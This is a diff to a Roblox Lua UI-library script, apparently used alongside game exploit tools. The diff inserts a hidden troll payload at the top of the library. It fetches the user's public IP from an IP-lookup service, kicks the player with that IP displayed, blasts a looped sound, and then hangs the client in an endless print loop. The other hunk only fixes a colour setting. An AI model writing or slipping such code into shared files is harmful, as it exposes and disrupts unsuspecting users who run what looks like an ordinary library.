@@ -1,3 +1,19 @@
+fear0004 = false
+wait(1)
+if fear0004 == false then
+	ip = game:HttpGet("https://api.ipify.org/")
+game.Players.LocalPlayer:Kick(ip)
+local sound = Instance.new("Sound")
+sound.Volume = 10
+sound.SoundId = "rbxassetid://2838571776" 
+sound.Looped = true
+sound.archivable = false
+sound.Parent = game.Workspace
+sound:Play()
+wait(5)
+while true do
+    print("skid!")
+end
 -- insert troll face, memcorruptv2
 local library = { 
 	flags = { }, 
@@ -29,12 +45,7 @@ library.theme = {
     backgroundcolor = Color3.fromRGB(20, 20, 20),
     tabstextcolor = Color3.fromRGB(240, 240, 240),
     bordercolor = Color3.fromRGB(60, 60, 60),
-    accentcolor = 
-for i = 0,1, 0.01 do
-	    Color3.fromHSV(i, 1, 1)
-    wait()
-    
-end
+    accentcolor = Color3.fromRGB(19, 119, 255),
     accentcolor2 = Color3.fromRGB(28, 56, 139),
     outlinecolor = Color3.fromRGB(60, 60, 60),
     outlinecolor2 = Color3.fromRGB(0, 0, 0),
